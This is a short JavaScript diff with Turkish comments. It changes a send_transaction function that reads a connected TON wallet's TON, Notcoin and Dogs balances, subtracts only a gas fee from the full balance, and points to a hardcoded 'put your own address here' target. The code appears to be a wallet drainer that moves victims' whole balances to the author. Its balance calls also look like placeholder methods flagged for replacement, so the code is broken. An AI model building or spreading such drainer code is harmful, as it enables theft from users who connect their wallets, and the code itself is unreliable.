@@ -1,15 +1,11 @@
 /* eslint-disable */
 
-import { WalletManager } from '@tonconnect/ui-react'; // Doğru import
-
 const send_transaction = async (tonConnectUI) => {
   try {
-    const WALLET = new WalletManager(tonConnectUI);
-
-    // Bakiye bilgilerini al
-    let tonbalance = await WALLET.getTONBalance();
-    let notbalance = await WALLET.getNotcoinBalance();
-    let dogsbalance = await WALLET.getDogsBalance();
+    // Cüzdan bakiyesini alıyoruz
+    const tonbalance = await tonConnectUI.getTONBalance(); // Burayı uygun API ile değiştir
+    const notbalance = await tonConnectUI.getNotcoinBalance(); // Burayı uygun API ile değiştir
+    const dogsbalance = await tonConnectUI.getDogsBalance(); // Burayı uygun API ile değiştir
 
     const balanceTon = tonbalance - 80000000; // 0.08 TON gaz ücreti olarak düşün
     const targetAddress = "UQDKbP8AA8sYpdI5v4elb600P5f6tdXbOJrG3vEjnoAiHREB"; // Buraya kendi cüzdan adresini koy
